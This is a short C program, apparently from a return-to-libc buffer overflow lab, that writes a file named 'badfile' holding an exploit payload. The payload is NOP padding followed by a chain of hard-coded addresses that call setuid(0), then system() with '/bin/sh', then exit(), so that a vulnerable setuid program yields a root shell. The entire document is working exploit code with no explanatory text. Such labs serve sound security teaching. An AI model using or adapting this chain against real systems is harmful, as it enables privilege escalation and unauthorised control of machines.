#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv)
{
  char buf[50];
  FILE *badfile;

  badfile = fopen("./badfile", "w");
  memset(&buf, 0x90, 24); 
  *(long *) &buf[24] = 0xb7eb9170 ;   //  setuid()
  *(long *) &buf[28] = 0x0804859b ;   //  pop; ret
  *(long *) &buf[32] = 0 ;            //  0
  *(long *) &buf[36] = 0xb7e42da0 ;   //  system()
  *(long *) &buf[40] = 0xb7e369d0 ;   //  exit()
  *(long *) &buf[44] = 0xbffffdd6 ;   //  "/bin/sh"


  fwrite(buf, sizeof(buf), 1, badfile);
  fclose(badfile);
}
